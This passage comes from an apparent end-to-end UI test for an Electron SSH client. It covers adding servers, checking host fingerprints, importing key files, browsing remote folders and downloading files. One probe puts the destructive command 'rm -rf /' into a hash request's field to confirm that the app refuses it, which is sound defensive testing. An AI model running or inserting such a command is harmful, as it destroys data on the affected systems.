        check('one field left to fix: it is named on its own, and the cursor is in it', (await text('#add-to-fix')).includes('User: needed') && !(await text('#add-to-fix')).includes('fields to fix') && (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'box-user', [await text('#add-to-fix'), await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)]);
        // Put the name and host back to nothing, so what follows types them as it did before.
        for (const id of ['#box-name', '#box-host']) {
          await clickOn(id);
          await selectAll();
          sh.sendInputEvent({ type: 'keyDown', keyCode: 'Backspace' });
          sh.sendInputEvent({ type: 'keyUp', keyCode: 'Backspace' });
          await sleep(80);
        }
        await clickOn('#box-name');
        await typeKeys('lab-box');
        await clickOn('#hue-pick');
        check('the colour is an option in the name field: its colours open under it', await until(() => has('.hue-menu'), 2000), '');
        await shot('add-colour', 'Add box, the colour opened');
        await clickOn('[data-hue="3"]');
        check('a colour picked closes the list', !(await has('.hue-menu')), '');
        await clickOn('#box-host');
        await typeKeys('127.0.0.1');
        await clickOn('#box-port');
        await typeKeys('99999');
        check('each field checks itself as it is typed', (await text('#box-name-check')).includes('free') && (await text('#box-host-check')) === 'an IP address' && (await text('#box-port-check')) === '1 to 65535', [await text('#box-name-check'), await text('#box-port-check')]);
        await selectAll();
        await typeKeys(port);
        await clickOn('#box-user');
        await typeKeys('demo');
        await clickOn('#place-0-name');
        await typeKeys('logs');
        await clickOn('#place-0-folder');
        await typeKeys('/var/log');
        check('a new place row appears under the one filled', await until(() => has('#place-1-name'), 2000), '');
        await shot('add-filled', 'Add box, filled in');
        await clickOn('#add-submit');
        const reached = await until(async () => (await step()) === 'reached', 20_000);
        check('Add box: the box is added in the colour picked, and its check opens at once, asking the box who it is', reached && ctx.boxes.list.length === 1 && ctx.boxes.list[0]?.colour === 3 && !(await has('#add-box')) && shellOnTop(), [await step(), ctx.boxes.list.length]);
        const id = ctx.boxes.list[0]?.id ?? '';
        const shownBefore = await js<string>(ctx.shell, `document.getElementById('check').textContent`);
        check('what the box showed is nowhere on the screen before a paste', !shownBefore.includes('SHA256:') || !printed.split(' ').some((w) => w.startsWith('SHA256:') && shownBefore.includes(w)), '');
        await clickOn('#check-copy');
        const copied = await until(async () => (await clipboard.readText()) === ctx.boxes.block(id), 2000);
        check('Copy puts the exact block on the clipboard', copied && (await clipboard.readText()).includes(ctx.boxes.list[0]!.publicKey), (await clipboard.readText()).slice(0, 60));
        // And the button says it copied. The footer says so too, but the footer is behind this dialog and its
        // dim, so from in here the press looked like nothing at all.
        check('Copy says it copied, on the button itself', await until(async () => (await text('#check-copy')).includes('Copied'), 2000), await text('#check-copy'));
        await shot('check-asked', 'the first-connection check, waiting for the paste');

        await clickOn('#check-paste');
        await typeKeys('256 SHA256:nB4yE8wQ2oL6cT0vR9mK3jH7gF5dS1aZ8xU4iP6eW2k root@elsewhere (ED25519)');
        const onScreen = await text('#check');
        check('a paste from another box: the dialog turns to a mismatch, what was pasted is shown, no Trust', (await until(async () => (await step()) === 'mismatch', 3000)) && (await has('#check-mismatch')) && !(await has('#check-trust')) && onScreen.includes('nB4yE8wQ'), await step());
        check('and the screen never prints what answered: the kind, and that its fingerprint is withheld', !printed.split(/\s+/).some((w) => w.startsWith('SHA256:') && onScreen.includes(w)) && onScreen.includes('its fingerprint is not shown here'), onScreen.slice(0, 200));
        await shot('check-mismatch', 'the first-connection check, another box answered');
        await clickOn('#check-paste');
        await selectAll();
        await typeKeys(printed.trim());
        check('the box\'s own line: a match, and Trust and connect', (await until(async () => (await step()) === 'match', 3000)) && (await has('#check-trust')), await step());
        await shot('check-match', 'the first-connection check, a match');
        await clickOn('#check-trust');
        check('Trust and connect: the dialog closes, the box is pinned, and a tab opens on it, the tab above the shell again', (await until(() => ctx.boxes.list[0]?.pin !== '' && !shellOnTop() && ctx.shellState().tabs.length === 1, 10_000)) && !(await has('#check')), [ctx.boxes.list[0]?.pin !== '', shellOnTop()]);
        const t1 = [...ctx.tabs.values()][0]!;
        await until(() => t1.engine.link.phase === 'ended', 20_000);
        check('the key is not on the box yet: the tab says the sign-in failed', t1.engine.link.cause === 'sign-in-failed' && (await text(`[data-tab="${t1.id}"]`)).includes('lab-box'), t1.engine.link);
        // A refused key is a stop, not a hiccup: Berth never opens a new session by itself after one, nor
        // after a box shows another identity. Trying again would only be refused again, or asked of a box
        // that may not be the box (plan A3 decision 6).
        const pidAfterRefusal = t1.engine.pid;
        await sleep(1200);
        check('and no new session is opened after a refused key, by itself or on a count', t1.againAt === 0 && t1.engine.pid === pidAfterRefusal && t1.engine.link.cause === 'sign-in-failed' && !(await text('#bar', t1)).includes('A new session opens'), [t1.againAt, t1.engine.pid === pidAfterRefusal, await text('#bar', t1)]);
        ctx.closeTab(t1.id);
        await lab.tell(`accept ${ctx.boxes.list[0]!.publicKey}`);

        // Bringing in a key the person already has (plan O1). This is what lets a box be added without any
        // other program: his boxes already hold his public key, so the private half is the way in, and nothing
        // has to be run on the box first.
        {
          // Real key files, written by the lab box in the format OpenSSH writes, which is what a person's own
          // files are: one plain, one with a passphrase.
          const dir = await mkdtemp(path.join(os.tmpdir(), 'berth-keyfile-'));
          const plain = path.join(dir, 'id_ed25519');
          const locked = path.join(dir, 'id_ed25519_locked');
          const plainSaid = await lab.tell(`keyfile ${plain}`);
          const lockedSaid = await lab.tell(`keyfile ${locked} the file passphrase`);
          check('the lab wrote two key files of the kind a person already has', typeof plainSaid['publicKey'] === 'string' && typeof lockedSaid['publicKey'] === 'string', [plainSaid['error'], lockedSaid['error']]);

          await clickOn('#boxes');
          await until(() => has('#box-menu'), 2000);
          await clickOn('#add-box-open');
          await until(() => has('#add-box'), 3000);
          check('Add box offers a key file, for a box that already holds one of his keys', await has('#key-file-pick'), '');

          // A file with a passphrase: said as that, and nothing is taken until it is given.
          await ctx.chooseKeyFile(locked);
          check('a key file with a passphrase is said to have one, and nothing is taken yet', await until(async () => (await has('#key-passphrase')) && (await text('#key-file-needs')).includes('has a passphrase'), 4000), await text('#key-file-needs'));
          await ctx.keyPassphrase('not the passphrase');
          check('the wrong passphrase is said plainly, and still nothing is taken', await until(async () => (await text('#key-file-needs')).includes('does not open it'), 4000), await text('#key-file-needs'));
          await ctx.keyPassphrase('the file passphrase');
          const opened = await until(async () => has('#key-file-key'), 4000);
          check('the right passphrase opens it, and the screen says which key it is', opened && (await text('#key-file-key')).includes('SHA256:'), await text('#key-file-key'));

          // Add box while the file has not opened: refused, with the reason, and no box is made. Adding with a
          // file that has not opened would be adding a box with no key at all.
          {
            await ctx.keyPassphrase('still not the passphrase');
            await until(async () => (await text('#key-file-needs')).includes('does not open it'), 4000);
            const before = ctx.boxes.list.length;
            await clickOn('#box-name');
            await typeKeys('not-added');
            await clickOn('#box-host');
            await typeKeys('127.0.0.1');
            await clickOn('#box-user');
            await typeKeys('demo');
            await clickOn('#add-submit');
            await sleep(600);
            check('Add box with a key file that has not opened is refused, and no box is made', ctx.boxes.list.length === before && !ctx.boxes.list.some((b) => b.name === 'not-added') && (await has('#add-box')), [ctx.boxes.list.length, before, await text('#add-error')]);
            for (const id of ['#box-name', '#box-host', '#box-user']) {
              await clickOn(id);
              await selectAll();
              sh.sendInputEvent({ type: 'keyDown', keyCode: 'Backspace' });
              sh.sendInputEvent({ type: 'keyUp', keyCode: 'Backspace' });
              await sleep(60);
            }
          }

          // Put it aside: the box would get a key Berth makes, as before.
          await clickOn('#key-file-drop');
          check('the key file can be put aside, and Berth makes one again', await until(async () => (await has('#key-file-pick')) && !(await has('#key-file-key')), 3000), '');

          // The plain file, and a box added with it.
          await ctx.chooseKeyFile(plain);
          const shown = await until(async () => has('#key-file-key'), 4000);
          const fileFingerprint = (await text('#key-file-key')).split(' ').find((w) => w.startsWith('SHA256:')) ?? '';
          check('a key file with no passphrase opens at once and names its key', shown && fileFingerprint !== '', await text('#key-file-key'));
          await shot('add-key-file', 'Add box, with a key file he already has');
          await clickOn('#box-name');
          await typeKeys('own-key-box');
          await clickOn('#box-host');
          await typeKeys('127.0.0.1');
          await clickOn('#box-port');
          await typeKeys(port);
          await clickOn('#box-user');
          await typeKeys('demo');
          await clickOn('#add-submit');
          const brought = await until(() => ctx.boxes.list.some((b) => b.name === 'own-key-box'), 20_000);
          const box = ctx.boxes.list.find((b) => b.name === 'own-key-box');
          const held = await ctx.keys.request('keys');
          const its = Array.isArray(held['keys']) ? (held['keys'] as Record<string, unknown>[]).find((k) => k['box'] === box?.id) : undefined;
          check('the box carries the key from his own file, not one Berth made', brought && box !== undefined && its !== undefined && box!.publicKey === its!['publicKey'] && fingerprintOf(box!.publicKey) === fileFingerprint, [box?.publicKey.slice(0, 40), fileFingerprint, its?.['origin']]);
          check('and the list says that key was brought in, not made here', its?.['origin'] === 'imported', its?.['origin']);
          check('the window says the box was added with his own key', (await text('#status-done')).includes('with your own key'), await text('#status-done'));
          // Nothing of the file is left in main once the box is made.
          check('the key file is let go once the box has it', ctx.shellState().keyFile === null, ctx.shellState().keyFile);

          // And the whole point of it: the box already knows this key, so Berth signs in with it and no block
          // was ever run on the box. The lab box is told to let that key in, as a real box already would.
          await lab.tell(`accept ${String(plainSaid['publicKey'])}`);
          await clickOn('#check-paste');
          await typeKeys(printed.trim());
          const matched2 = await until(async () => (await step()) === 'match', 6000);
          check('a box added with his own key is checked like any other', matched2, await step());
          await clickOn('#check-trust');
          const inWithOwn = await until(() => [...ctx.tabs.values()].some((t) => t.box?.id === box?.id && t.engine.link.phase === 'up'), 25_000);
          check('and Berth signs in to it with that key, having run nothing on the box', inWithOwn, [...ctx.tabs.values()].map((t) => t.engine.link.phase));
          for (const t of [...ctx.tabs.values()].filter((t) => t.box?.id === box?.id)) ctx.closeTab(t.id);
          await lab.tell(`accept ${ctx.boxes.list.find((b) => b.name === 'lab-box')?.publicKey ?? ''}`);
          for (const b of ctx.boxes.list.filter((x) => x.name === 'own-key-box')) await ctx.boxes.remove(b.id);
          await rm(dir, { recursive: true, force: true });
        }

        // The Boxes menu: the box, its place beside it; a place opens a tab there.
        await clickOn('#boxes');
        check('Boxes opens the menu, above the tabs', (await until(() => has('#box-menu'), 2000)) && (await until(shellOnTop, 1000)) && (await text('#box-menu')).includes('lab-box'), '');
        // Nothing a person is pointing at may move under them. Edit and Delete appear on the row when it is
        // hovered, and their room has to be there before that: taken out of the row and put back, they made the
        // row grow and pushed the box's name into wrapping (the owner, 2026-11-17).
        const rowBox = () => js<{ h: number; nameW: number; rowW: number }>(ctx.shell, `(() => { const r = document.querySelector('[data-box="lab-box"]'); const n = r.querySelector('.bm-name'); return { h: Math.round(r.getBoundingClientRect().height), nameW: Math.round(n.getBoundingClientRect().width), rowW: Math.round(r.getBoundingClientRect().width) }; })()`);
        const before = await rowBox();
        await moveTo('[data-box="lab-box"]');
        check('its places open beside it', await until(() => has('[data-place="logs"]'), 2000), '');
        const after = await rowBox();
        const actsShown = await js<boolean>(ctx.shell, `(() => { const a = document.querySelector('[data-box="lab-box"] .bm-acts'); return a !== null && getComputedStyle(a).opacity === '1'; })()`);
        check('hovering a box row shows Edit and Delete without the row moving under the hand', actsShown && after.h === before.h && after.nameW === before.nameW && after.rowW === before.rowW, [before, after, actsShown]);
        await shot('boxes-menu', 'the Boxes menu, a box\'s places open');
        await clickOn('[data-place="logs"]');
        const t2ok = await until(() => [...ctx.tabs.values()].some((t) => t.place === 'logs' && t.engine.link.phase === 'up'), 20_000);
        check('a place opens a tab there, signed in; the menu is gone and the tab is above the shell', t2ok && !(await has('#box-menu')) && !shellOnTop(), [...ctx.tabs.values()].map((t) => t.engine.link.phase));
        check('the tab says its box and its place, in the box\'s colour', (await text('[data-tab]')).includes('lab-box') && (await text('[data-tab]')).includes('logs') && (await text('#status')).includes('lab-box, logs'), await text('#status'));
        // The terminal is framed in its box's colour too. The tabs carry it already; the thing a person types
        // into did not, so with two boxes open there was nothing in the terminal itself to say which it was.
        {
          const front = [...ctx.tabs.values()].find((t) => t.place === 'logs')!;
          const hue = () => js<string>(front.view, `getComputedStyle(document.documentElement).getPropertyValue('--hue').trim()`);
          const shadow = () => js<string>(front.view, `getComputedStyle(document.getElementById('term')).boxShadow`);
          const live = () => js<string>(front.view, `document.documentElement.dataset.live ?? ''`);
          // The browser gives a custom property back worked out, so --hue reads as the colour itself, not as the
          // name it was set from: it is compared with that box's colour, worked out the same way.
          const itsColour = await js<string>(front.view, `getComputedStyle(document.documentElement).getPropertyValue('--box-${front.box!.colour}').trim()`);
          const framed = await until(async () => (await hue()) === itsColour && itsColour !== '', 4000);
          // The box's colour is mixed into the frame, so the frame is not the one a tab with no box wears. The
          // two are compared as the browser works them out, not as they are written.
          const wearing = await shadow();
          const plainFrame = await js<string>(front.view, `(() => { const d = document.createElement('div'); d.style.boxShadow = 'inset 0 0 0 1px var(--line)'; document.body.appendChild(d); const v = getComputedStyle(d).boxShadow; d.remove(); return v; })()`);
          check('the terminal is framed in its box\'s own colour, not the plain line colour', framed && (await live()) === 'yes' && wearing !== plainFrame, [await hue(), wearing.slice(0, 70), plainFrame.slice(0, 70)]);
          // And the window says which box it is on, for the taskbar: Berth draws its own title bar, so this is
          // the only place that name is read.
          check('the window names the box and place it is on', ctx.win.title.startsWith('lab-box') && ctx.win.title.includes('logs') && ctx.win.title.includes('Berth'), ctx.win.title);
        }
        // The tab's own file browser, on its own channel to the box: the folder is listed and drawn while the
        // terminal on the same link goes on working.
        {
          const front = [...ctx.tabs.values()].find((t) => t.place === 'logs')!;
          const listed = await until(async () => (await js<number>(front.view, `document.querySelectorAll('#fb-list .fb-row').length`)) > 0, 15_000);
          const names = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`);
          const kinds = await js<Record<string, string>>(front.view, `Object.fromEntries([...document.querySelectorAll('#fb-list .fb-row')].map((r) => [r.dataset.name, r.dataset.kind]))`);
          const path0 = await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`);
          check('the tab lists its box\'s own folder in its own file browser', listed && path0.endsWith('/var/log') && names.includes('syslog') && names.includes('ledger'), [path0, names.slice(0, 10)]);
          check('and each row says what it is', kinds['ledger'] === 'folder' && kinds['syslog'] === 'file', kinds);
          // Folders first, then names as a person reads them.
          const real = names.filter((n) => n !== '..');
          const folders = real.filter((n) => kinds[n] === 'folder');
          check('folders come first', real.slice(0, folders.length).every((n) => kinds[n] === 'folder'), real);
          const foot = await js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`);
          check('the footer says how many things are there and what is left of the disk', /\d+ items/.test(foot) && foot.includes('free of'), foot);
          // Going into a folder lists it, and the way up comes back.
          await js(front.view, `document.querySelector('[data-name="ledger"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
          const wentIn = await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('today.log'), 10_000);
          const path1 = await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`);
          check('going into a folder lists that folder, and the path says where it is', wentIn && path1.endsWith('/var/log/ledger'), [path1, wentIn]);
          await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
          check('and the way up comes back to the folder above', await until(async () => (await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`)).endsWith('/var/log'), 10_000), await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`));
          // The list is reached by the keyboard as well as by a mouse (BUILD-RULES 2.16): one row carries the
          // tab stop so Tab lands on the list once, the arrows move inside it, and Enter does what a
          // double-click does.
          {
            const tap = async (keyCode: string, modifiers: ('control' | 'shift' | 'alt')[] = []): Promise<void> => {
              front.view.webContents.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
              front.view.webContents.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
              await sleep(120);
            };
            const standing = (): Promise<string> => js<string>(front.view, `document.querySelector('#fb-list .fb-row[tabindex="0"]')?.dataset.name ?? ''`);
            const focused = (): Promise<string> => js<string>(front.view, `document.activeElement?.dataset?.name ?? ''`);
            // The folder above was asked for again on the way up, and the path says where it is as soon as the
            // box names it, which is before any row of it has arrived: the list is waited for, so what is
            // read below is a list that is really on screen.
            const backWithRows = await until(async () => (await js<number>(front.view, `document.querySelectorAll('#fb-list .fb-row').length`)) > 1, 15_000);
            check('the folder above is on screen again, rows and all', backWithRows, backWithRows);
            // Read in one go, so the three say what the list was at one moment and not at three.
            const stop = await js<{ stops: number; first: string; standing: string }>(front.view, `(() => { const r = [...document.querySelectorAll('#fb-list .fb-row')]; return { stops: r.filter((e) => e.tabIndex === 0).length, first: r[0]?.dataset.name ?? '', standing: r.find((e) => e.tabIndex === 0)?.dataset.name ?? '' }; })()`);
            const firstName = stop.first;
            check('one row of the list carries the tab stop, so Tab reaches the list once', stop.stops === 1 && stop.standing === stop.first && stop.first !== '', stop);
            await js(front.view, `document.querySelector('#fb-list .fb-row[tabindex="0"]')?.focus()`);
            await tap('Down');
            const second = await standing();
            await tap('Down');
            const third = await standing();
            await tap('Up');
            check('the arrows move the place, and the row holding it is the one with the focus', second !== firstName && third !== second && (await standing()) === second && (await focused()) === second, [firstName, second, third, await focused()]);
            await tap('End');
            const atEnd = await standing();
            await tap('Home');
            check('Home and End reach the two ends of the list', atEnd !== firstName && (await standing()) === firstName, [atEnd, firstName, await standing()]);
            // Enter on a folder goes into it; Backspace comes back out. Nothing here needs a mouse.
            const standOn = async (name: string): Promise<boolean> => {
              const there = await until(async () => (await js<number>(front.view, `document.querySelectorAll('#fb-list .fb-row[data-name="${name}"]').length`)) === 1, 8000);
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="${name}"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
              await js(front.view, `document.querySelector('#fb-list .fb-row[tabindex="0"]')?.focus()`);
              await sleep(80);
              return there && (await standing()) === name;
            };
            const onLedger = await standOn('ledger');
            await tap('Return');
            const inFolder = await until(async () => (await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`)).endsWith('/var/log/ledger'), 10_000);
            await js(front.view, `document.querySelector('#fb-list .fb-row[tabindex="0"]')?.focus()`);
            await tap('Backspace');
            const backOut = await until(async () => (await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`)).endsWith('/var/log'), 10_000);
            check('Enter goes into a folder and Backspace comes back out, with no mouse anywhere in it', onLedger && inFolder && backOut, [onLedger, inFolder, backOut]);
            // A thing that is neither a file nor a folder opens nothing, and the press is answered rather than
            // swallowed: the foot says what the thing is.
            const onLink = await standOn('current');
            await tap('Return');
            await sleep(200);
            const footSaid = await js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`);
            check('Enter on something that is neither a file nor a folder opens nothing and says what it is', onLink && footSaid.includes('current is a link') && (await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`)).endsWith('/var/log'), [onLink, footSaid]);
            // Ctrl with a key is not the list's: it belongs to the window or to the box, and the place stays.
            const before = await standing();
            await tap('Down', ['control']);
            check('a press with Ctrl held is not the list\'s, and the place does not move', (await standing()) === before, [before, await standing()]);
            // And the window's own keys work from in here: the focus is on a file, which is where it is while
            // a file is being picked, and Ctrl+Tab still moves between tabs rather than being swallowed.
            {
              // A second tab for this one probe, so there is somewhere for the press to go, and it is closed
              // again straight after.
              const spare = ctx.openTab()!;
              await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${front.id} })`);
              await until(() => ctx.shellState().active === front.id, 3000);
              ctx.win.focus();
              await until(() => ctx.win.isFocused(), 4000);
              // The list is drawn again whenever anything it says changes, and a row drawn again is a new row
              // that holds no focus. So the focus is asked for until it sticks, rather than asked for once and
              // read a moment later: otherwise this probe is about what the pane happened to be doing.
              const onAFile = await until(async () => js<boolean>(front.view, `(document.querySelector('#fb-list .fb-row[tabindex="0"]')?.focus(), document.activeElement?.classList.contains('fb-row') === true)`), 4000);
              await tap('Tab', ['control']);
              const switched = await until(() => ctx.shellState().active === spare.id, 3000);
              const stayedPut = (await standing()) === before;
              ctx.closeTab(spare.id);
              await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${front.id} })`);
              await until(() => ctx.shellState().active === front.id, 3000);
              check('Ctrl+Tab works with the focus on a file in the list, and the place in the list does not move', onAFile && switched && stayedPut, [onAFile, switched, stayedPut]);
            }
          }
          // Bringing a file over to the PC. The view says which file on its own box and nothing else: where it
          // lands and what it is called there are main's (plan B2.7). What arrives must be the box's own bytes,
          // and the window must say so only when the box itself agrees.
          {
            const tap = async (keyCode: string, modifiers: ('control' | 'shift' | 'alt')[] = []): Promise<void> => {
              front.view.webContents.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
              front.view.webContents.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
              await sleep(120);
            };
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            const standOn = async (name: string): Promise<boolean> => {
              const there = await until(async () => (await js<number>(front.view, `document.querySelectorAll('#fb-list .fb-row[data-name="${name}"]').length`)) === 1, 8000);
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="${name}"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
              await js(front.view, `document.querySelector('#fb-list .fb-row[tabindex="0"]')?.focus()`);
              await sleep(80);
              return there;
            };
            // Ctrl+S on a file brings it over. Nothing else a person did names a place on this PC.
            await standOn('syslog');
            await tap('S', ['control']);
            const arrived = await until(async () => (await foot()).includes('is in the download folder'), 25_000);
            const said = await foot();
            const landed = path.join(ctx.downloads, 'syslog');
            const bytes = await readFile(landed).catch(() => Buffer.alloc(0));
            // The box was asked for its own hash of that file, on a channel of its own, and nothing else ran.
            const ranOnTheBox = ((await lab.tell('seen'))['sessions'] as { Command?: string }[]).map((x) => x.Command ?? '').filter((c) => c !== '');
            check('Ctrl+S on a file brings it over, and the window says where it went and that the box agrees', arrived && said.includes('checked against the box') && bytes.toString() === "a line of the box's own log\n", [said, bytes.length, ranOnTheBox]);
            // The same file again: it lands beside the first one under a free name, and the first is untouched.
            await tap('S', ['control']);
            const again = await until(async () => (await foot()).includes('syslog (2)'), 25_000);
            const first = await readFile(landed).catch(() => Buffer.alloc(0));
            const second = await readFile(path.join(ctx.downloads, 'syslog (2)')).catch(() => Buffer.alloc(0));
            check('the same file again lands beside the first under a free name, and the first is untouched', again && first.toString() === second.toString() && first.length > 0, [await foot(), first.length, second.length]);
            // A name this PC cannot hold as it is: it lands under one it can, and the window says why.
            const odd = await lab.tell('oddnames var/log');
            check('the lab made files whose names a PC cannot hold', odd['made'] === 5, odd);
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('a:b.txt'), 10_000);
            await standOn('a:b.txt');
            await tap('S', ['control']);
            const renamed = await until(async () => (await foot()).includes('is in the download folder'), 25_000);
            const renamedSaid = await foot();
            const here = await readdir(ctx.downloads).catch(() => [] as string[]);
            check('a name this PC cannot hold lands under one it can, and the window says why', renamed && renamedSaid.includes('renamed') && here.includes('a_b.txt') && !here.some((n) => n.includes(':')), [renamedSaid, here]);
            // A box that says a file is bigger than this disk can hold: nothing is written at all, and the
            // window says why. The check is made on what the box said, before a single byte is kept.
            // A file big enough that, were the room asked about while it was already arriving, it would still
            // be arriving when this probe looks: that is what makes the answer below about the order of things
            // and not about which of two races happened to win.
            const heavy = await lab.tell('bigfile var/log/heavy.log 4000000');
            check('the lab made a file big enough to catch a download that started before it should', heavy['bytes'] === 4000000, heavy);
            await lab.tell('filepace 40');
            const lying = await lab.tell('pretendsize heavy.log 900000000000000');
            check('the lab box is set to say a file is bigger than any disk', lying['size'] === 900000000000000, lying);
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('heavy.log'), 10_000);
            const before = await readdir(ctx.downloads).catch(() => [] as string[]);
            await standOn('heavy.log');
            await tap('S', ['control']);
            const refused = await until(async () => (await foot()).includes('not enough room'), 25_000);
            // Nothing was ever opened on the PC: not a file under its own name, and not one of the app's own
            // half-written ones. The folder is looked at the moment the refusal lands and again after, because
            // a download that had started would still be going now.
            const atOnce = await readdir(ctx.downloads).catch(() => [] as string[]);
            await sleep(600);
            const after = await readdir(ctx.downloads).catch(() => [] as string[]);
            await lab.tell('pretendsize - 0');
            await lab.tell('filepace 0');
            await lab.tell('forget var/log/heavy.log');
            check('a file bigger than the disk is refused before anything is opened, and the window says why', refused && atOnce.length === before.length && after.length === before.length && after.every((n) => !n.startsWith('.berth-')), [await foot(), before, atOnce, after]);
            // Back to the folder the probes after this one expect.
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('syslog'), 10_000);
          }
          // A box's own hash of one of its files, because a person asked for it. Only two hashes may ever be
          // asked of a box, and what comes back can be compared with one pasted in without reading sixty-four
          // characters by eye.
          {
            const tap = async (keyCode: string, modifiers: ('control' | 'shift' | 'alt')[] = []): Promise<void> => {
              front.view.webContents.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
              front.view.webContents.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
              await sleep(120);
            };
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="syslog"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
            await js(front.view, `document.querySelector('#fb-list .fb-row[tabindex="0"]')?.focus()`);
            await tap('H', ['control']);
            const gotOne = await until(async () => (await js<string>(front.view, `document.getElementById('fb-hash-value')?.textContent ?? ''`)).length === 64, 20_000);
            const shown = await js<string>(front.view, `document.getElementById('fb-hash-value')?.textContent ?? ''`);
            const want = createHash('sha256').update("a line of the box's own log\n").digest('hex');
            check('Ctrl+H asks the box for its own hash of the file, and it is the file\'s real hash', gotOne && shown === want, [shown, want]);
            // Copy puts exactly that on the clipboard, and nothing else.
            clipboard.writeText('untouched');
            ctx.win.focus();
            await until(() => ctx.win.isFocused(), 4000);
            await clickOn('#fb-hash-copy', front);
            const copied = await until(async () => (await clipboard.readText()) === want, 4000);
            check('Copy puts that hash on the clipboard and nothing else', copied, await clipboard.readText());
            // What it should be, pasted in: the same, and then not the same.
            await js(front.view, `(() => { const f = document.getElementById('fb-hash-expected'); f.value = '${want}  syslog'; f.dispatchEvent(new Event('input', { bubbles: true })); })()`);
            await sleep(200);
            const same = await js<string>(front.view, `document.getElementById('fb-hash-said')?.textContent ?? ''`);
            await js(front.view, `(() => { const f = document.getElementById('fb-hash-expected'); f.value = '${'0'.repeat(64)}'; f.dispatchEvent(new Event('input', { bubbles: true })); })()`);
            await sleep(200);
            const notSame = await js<string>(front.view, `document.getElementById('fb-hash-said')?.textContent ?? ''`);
            check('a hash pasted in is compared, even with a file name beside it, and says plainly which it is', same === 'The same' && notSame === 'Not the same', [same, notSame]);
            await shot('a-hash-asked-for', "a box's own hash of a file, with what it should be pasted in", front);
            // Only the two written-down hashes may ever be asked of a box. A view asking for anything else is
            // refused by main before it reaches an engine, and the box is left alone.
            const droppedBefore = ctx.dropped();
            const ranBefore = ((await lab.tell('seen'))['sessions'] as { Command?: string }[]).length;
            await js(front.view, `(window.tabPort.files({ id: 90001, do: 'hash', path: '/var/log/syslog', which: 'rm -rf /' }), window.tabPort.files({ id: 90002, do: 'hash', path: '/var/log/syslog' }))`);
            await sleep(500);
            const ranAfter = ((await lab.tell('seen'))['sessions'] as { Command?: string }[]).length;
            check('a view may ask a box for one of two hashes and for nothing else', ctx.dropped() === droppedBefore + 2 && ranAfter === ranBefore, [ctx.dropped() - droppedBefore, ranBefore, ranAfter]);
            await js(front.view, `document.getElementById('fb-hash-shut')?.click()`);
            await until(async () => !(await js<boolean>(front.view, `document.getElementById('fb-hash') !== null`)), 3000);
          }
          // Stopping a transfer that is under way: it stops, and nothing of it is left on the PC.
          {
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            const big = await lab.tell('bigfile var/log/wide.log 8000000');
            check('the lab made a file big enough to stop in the middle of', big['bytes'] === 8000000, big);
            await lab.tell('filepace 60');
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
